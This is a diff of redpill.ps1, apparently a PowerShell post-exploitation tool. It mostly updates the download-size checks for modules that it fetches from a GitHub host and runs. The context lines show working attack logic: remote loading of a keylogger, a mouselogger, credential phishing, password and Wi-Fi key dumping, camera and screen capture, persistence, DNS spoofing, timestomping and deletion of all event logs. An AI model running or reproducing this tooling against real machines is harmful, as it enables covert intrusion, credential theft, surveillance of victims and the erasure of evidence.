@@ -204,7 +204,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 15){## Corrupted download detected => DefaultFileSize: 15,0107421875/KB
+      If($SizeDump -lt 15){## Corrupted download detected => DefaultFileSize: 15,1513671875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -260,7 +260,7 @@ If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1 -Destination $Env:TMP\GetConnections.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetConnections.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,970703125/KB
+      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,1708984375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetConnections.ps1"){Remove-Item -Path "$Env:TMP\GetConnections.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -306,7 +306,7 @@ If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetDnsCache.ps1 -Destination $Env:TMP\GetDnsCache.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetDnsCache.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 1){## Corrupted download detected => DefaultFileSize: 1,7744140625/KB
+      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,041015625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetDnsCache.ps1"){Remove-Item -Path "$Env:TMP\GetDnsCache.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -364,7 +364,7 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose" -or $GetBrowsers -ie
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/EnumBrowsers.ps1 -Destination $Env:TMP\EnumBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\EnumBrowsers.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,546875/KB
+      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,5556640625KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -455,7 +455,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1 -Destination $Env:TMP\GetProcess.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetProcess.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,3818359375/KB
+      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,65234375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -518,7 +518,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetTasks.ps1 -Destination $Env:TMP\GetTasks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetTasks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,9326171875/KB
+      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,361328125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -581,7 +581,7 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,0234375/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,296875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -634,7 +634,7 @@ If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Camera.ps1 -Destination $Env:TMP\Camera.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Camera.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,650390625/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,83984375KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Camera.ps1"){Remove-Item -Path "$Env:TMP\Camera.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -683,7 +683,7 @@ If($Screenshot -gt 0){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Screenshot.ps1 -Destination $Env:TMP\Screenshot.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Screenshot.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,9794921875/KB
+      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,2705078125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Screenshot.ps1"){Remove-Item -Path "$Env:TMP\Screenshot.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -727,7 +727,7 @@ If($Upload -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Upload.ps1 -Destination $Env:TMP\Upload.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Upload.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,9677734375/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,3623046875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Upload.ps1"){Remove-Item -Path "$Env:TMP\Upload.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -915,7 +915,7 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/StartWebServer.ps1 -Destination $Env:TMP\StartWebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\StartWebServer.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,078125/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,56640625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -966,7 +966,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Keylogger.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,126953125/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,328125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Keylogger.ps1"){Remove-Item -Path "$Env:TMP\Keylogger.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1031,7 +1031,7 @@ If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Mouselogger.ps1 -Destination $Env:TMP\Mouselogger.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Mouselogger.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,9951171875/KB
+      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,0830078125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Mouselogger.ps1"){Remove-Item -Path "$Env:TMP\Mouselogger.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1094,7 +1094,7 @@ If($PhishCreds -ieq "Start"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 10,291015625/KB
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 10,28515625/KB
    If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 10 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
@@ -1156,7 +1156,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,37109375/KB
+      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,5205078125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1212,7 +1212,7 @@ If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB) ## Default => 84,8359375/KB
+   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB) ## Default => 84,7734375KB
    If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 84 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
@@ -1284,7 +1284,7 @@ If($ADS -ieq "Enum" -or $ADS -ieq "Create" -or $ADS -ieq "Exec" -or $ADS -ieq "C
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1 -Destination $Env:TMP\AdsMasquerade.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AdsMasquerade.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,880859375/KB
+      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,859375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1"){Remove-Item -Path "$Env:TMP\AdsMasquerade.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1346,7 +1346,7 @@ If($WifiPasswords -ieq "Dump" -or $WifiPasswords -ieq "ZipDump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/WifiPasswords.ps1 -Destination $Env:TMP\WifiPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\WifiPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,171875/KB
+      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,455078125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\WifiPasswords.ps1"){Remove-Item -Path "$Env:TMP\WifiPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1499,7 +1499,7 @@ If($FileMace -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/FileMace.ps1 -Destination $Env:TMP\FileMace.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\FileMace.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 1){## Corrupted download detected => DefaultFileSize: 1,96875/KB
+      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,2607421875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\FileMace.ps1"){Remove-Item -Path "$Env:TMP\FileMace.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1613,7 +1613,7 @@ If($NetTrace -ieq "Enum"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NetTrace.ps1 -Destination $Env:TMP\NetTrace.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\NetTrace.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,267578125/KB
+      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,5419921875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\NetTrace.ps1"){Remove-Item -Path "$Env:TMP\NetTrace.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1675,7 +1675,7 @@ If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Persiste.ps1 -Destination $Env:TMP\Persiste.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Persiste.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 6){## Corrupted download detected => DefaultFileSize: 6,732421875/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,0419921875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Persiste.ps1"){Remove-Item -Path "$Env:TMP\Persiste.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1738,7 +1738,7 @@ If($PingSweep -ieq "Enum" -or $PingSweep -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1 -Destination $Env:TMP\PingSweep.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\PingSweep.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,9453125/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,2177734375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\PingSweep.ps1"){Remove-Item -Path "$Env:TMP\PingSweep.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1775,6 +1775,7 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CleanTracks Clear
+      Clean Temp\Logs\Script artifacts left behind
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CleanTracks Paranoid
@@ -1791,7 +1792,7 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1 -Destination $Env:TMP\CleanTracks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\CleanTracks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,4541015625/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,6474609375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1951,7 +1952,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,21484375/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,23828125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2026,7 +2027,7 @@ If($DnsSpoof -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DnsSpoof.ps1 -Destination $Env:TMP\DnsSpoof.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\DnsSpoof.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 6){## Corrupted download detected => DefaultFileSize: 6,8720703125/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,0283203125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2803,7 +2804,7 @@ $HelpParameters = @"
 
    .NOTES
       Required Dependencies: cmd|regedit {native}
-      Paranoid @arg deletes @redpill auxiliary
+      Paranoid @argument deletes @redpill auxiliary
       scripts and Deletes All eventvwr logs {admin privs}
 
    .EXAMPLE
